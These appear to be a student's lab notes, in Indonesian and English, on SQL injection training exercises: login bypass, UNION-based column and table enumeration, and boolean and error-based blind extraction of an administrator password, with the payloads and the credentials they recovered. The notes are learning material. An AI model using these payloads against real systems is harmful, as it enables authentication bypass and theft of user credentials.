# 1. Basic SQL Injection

### Query Given:
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

### End Goal:
Menampilkan semua produk, baik yang telah dirilis maupun yang belum.

### Fuzzing dengan Payload Manual:
```sql
SELECT * FROM products WHERE category = 'Pets' AND released = 1;
SELECT * FROM products WHERE category = ''' AND released = 1;
SELECT * FROM products WHERE category = ''--' AND released = 1;
SELECT * FROM products WHERE category = '';
SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1;
```

### Library Python yang Digunakan:
- `requests`
- `sys` (untuk mengambil argumen dari CLI)

---



# 2. Vulnerability Allowing Login Bypass

### Asumsi Query SQL untuk Autentikasi:
```sql
SELECT * FROM USERS WHERE username = "input" AND password == "input"
```

### Fuzzing Hingga Query Berubah:
```sql
SELECT * FROM USERS WHERE username = "' OR 1=1 -- " AND password == "input"
```

### Library Python yang Digunakan:
- `BeautifulSoup` (untuk mendapatkan CSRF token dari HTML)

---

# 3. SQLi UNION Attack: Menentukan Jumlah Kolom & Menemukan Kolom Tipe Teks

### End Goal:
Menentukan jumlah kolom yang dikembalikan oleh query.

### Contoh UNION Query:
```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2;
```

### Rules:
- Jumlah dan urutan kolom harus sama.
- Tipe data harus kompatibel.

### Menentukan Jumlah Kolom:
```sql
SELECT ? FROM table1 UNION SELECT NULL, NULL;  -- error (jumlah kolom salah)
SELECT ? FROM table1 UNION SELECT NULL, NULL, NULL;  -- sukses (jumlah kolom benar)
```

### Menentukan Tipe Data Kolom:
```sql
SELECT a, b, c FROM table1 UNION SELECT NULL, NULL, 'a';
```
Jika tidak ada error, berarti kolom `c` bertipe string.

---


# 4. UNION Attack: Mengambil Data dari Tabel Lain

### End Goal:
Menampilkan username dan password dari tabel `users` dan login sebagai administrator.

### Langkah-Langkah:
1. Menentukan jumlah kolom:
   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3-- (error)
   ```
   → Jumlah kolom = 2

2. Menentukan tipe data kolom:
   ```sql
   ' UNION SELECT NULL, 'a'--
   ' UNION SELECT 'a', 'a'-- (error)
   ```
   → Salah satu kolom bertipe string.

3. Payload untuk mendapatkan kredensial:
   ```sql
   ' UNION SELECT NULL, username || '~' || password FROM users--
   ```
   **Output:** `administrator~zow0ture2abq8dc3062m`

---

# 5. SQL Injection: Mengetahui Tipe dan Versi Database (MySQL & Microsoft SQL)

### Langkah-Langkah:
4. Intercept request menggunakan **Burp Suite**.
5. Menentukan jumlah dan tipe data kolom:
   ```sql
   '+UNION+SELECT+'abc','def'#
   ```
6. Menampilkan versi database:
   ```sql
   '+UNION+SELECT+@@version,+NULL#
   ```

---

# 6. SQL Injection: Menampilkan Isi Database pada Non-Oracle

### Langkah-Langkah:
7. Intercept request menggunakan **Burp Suite**.
8. Menentukan jumlah dan tipe data kolom:
   ```sql
   '+UNION+SELECT+'abc','def'--
   ```
9. Menampilkan daftar tabel dalam database:
   ```sql
   '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
   ```
10. Menentukan tabel yang menyimpan kredensial pengguna.
11. Menampilkan daftar kolom dalam tabel pengguna:
   ```sql
   '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
   ```
12. Menemukan nama kolom untuk username dan password.
13. Mendapatkan kredensial pengguna:
   ```sql
   '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
   ```
14. Menemukan password admin dan menggunakannya untuk login.

---

# 7. Blind SQL Injection

# Vulnerable Parameter - Tracking Cookie

## End Goals:

1. Enumerate the password of the administrator.
2. Log in as the administrator user.

## Analysis:

### 1) Confirming SQL Injection Vulnerability

```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'RvLfBu6s9EZRlVYN';
```

- **If the tracking ID exists** → Query returns value → "Welcome back" message appears.
- **If the tracking ID doesn't exist** → Query returns nothing → No "Welcome back" message.

Testing Boolean-based Blind SQL Injection:

```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'RvLfBu6s9EZRlVYN' AND 1=1--';
```

- **TRUE** → "Welcome back" message appears.

```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'RvLfBu6s9EZRlVYN' AND 1=0--';
```

- **FALSE** → No "Welcome back" message.

### 2) Confirming the Presence of the `users` Table

```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'RvLfBu6s9EZRlVYN' AND (SELECT 'x' FROM users LIMIT 1)='x'--';
```

- **If the table exists** → "Welcome back" message appears.

### 3) Checking if the `administrator` User Exists

```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'RvLfBu6s9EZRlVYN' AND (SELECT username FROM users WHERE username='administrator')='administrator'--';
```

- **If the administrator user exists** → "Welcome back" message appears.

### 4) Enumerating the Administrator's Password

Checking password length:

```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'RvLfBu6s9EZRlVYN' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>20)='administrator'--';
```

- **Response confirms** password is exactly **20 characters** long.

Extracting the password character by character:

```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'RvLfBu6s9EZRlVYN' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a'--';
```

#### Extracted Password:

| Position  | 1   | 2   | 3   | 4   | 5   | 6   | 7   | 8   | 9   | 10  | 11  | 12  | 13  | 14  | 15  | 16  | 17  | 18  | 19  | 20  |
| --------- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| Character | 5   | 2   | r   | q   | b   | j   | t   | j   | p   | a   | 7   | 4   | 9   | c   | y   | 0   | b   | v   | 6   | s   |

Extracted password: **52rqbjtjpa749cy0bv6s**

Note: ```
```sql
SUBSTRING(string, posisi_awal, jumlah_karakter);
``` 

# 8. Blind sql with error condition (error based)

### End Goals:

- Output the administrator password.
- Login as the administrator user.

## Analysis:

### 1) Proving the Parameter is Vulnerable

```sql
' || (SELECT '' FROM dual) || '
```

- **Valid query** → No error.

```sql
' || (SELECT '' FROM dualfiewjfow) || '
```

- **Invalid table** → Error occurs.

### 2) Confirming the `users` Table Exists

```sql
' || (SELECT '' FROM users WHERE ROWNUM = 1) || '
```

- **If table exists** → No error.

### 3) Checking if the `administrator` User Exists

```sql
' || (SELECT '' FROM users WHERE username='administrator') || '
```

- **If user exists** → No error.

#### Using Conditional Errors:

```sql
' || (SELECT CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || '
```

- **No division by zero** → No error.

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

- **Internal server error** → Administrator user exists.

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='fwefwoeijfewow') || '
```

- **200 response** → User does not exist.

### 4) Determining Password Length

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password) > 19) || '
```

- **200 response at 50** → Password length < 50.
- **Confirmed password length** → 20 characters.

### 5) Extracting the Administrator Password

```sql
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a') || '
```

- **Response confirms** first character is not `w`.

#### Extracted Password:

`wjuc497wl6szhbtf0cbf`

### Script Execution

```bash
python script.py <url>
```

# 9 Visible Error-Based SQL Injection

## **End Goal**

Eksploitasi SQL injection untuk mendapatkan kredensial admin dari tabel `users` dan masuk ke akun mereka.

---

## **Analysis**

Query SQL yang dieksekusi oleh aplikasi:

```sql
SELECT trackingId FROM trackingIdTable WHERE trackingId='pFNjoVuG3fnTFJ3a''
```

Kesalahan yang muncul saat terjadi injeksi:

```sql
SELECT * FROM tracking WHERE id = 'pFNjoVuG3fnTFJ3a'--'. Expected char
```

### **Menggunakan CAST() untuk Mengeksploitasi SQL Injection**

Fungsi `CAST()` digunakan untuk mengubah tipe data agar query tetap valid meskipun terjadi injeksi.

#### **Payload Uji Coba**

```sql
pFNjoVuG3fnTFJ3a' AND CAST((SELECT 1) AS INT)--
```

#### **Payload untuk Mengekstrak Data dari Tabel Users**

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--
```

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
```

### **Kesimpulan**

1. **Error-based SQL Injection terlihat jelas** melalui pesan error yang muncul.
2. **CAST() digunakan untuk menghindari kesalahan tipe data** saat mengeksekusi subquery.
3. **Dengan memanfaatkan error yang ditampilkan**, kita bisa mengekstrak data dari tabel `users` secara bertahap.

---

**Payload terakhir yang berhasil:**

```sql
fc9v2vqq5gozv1cb0ibj
```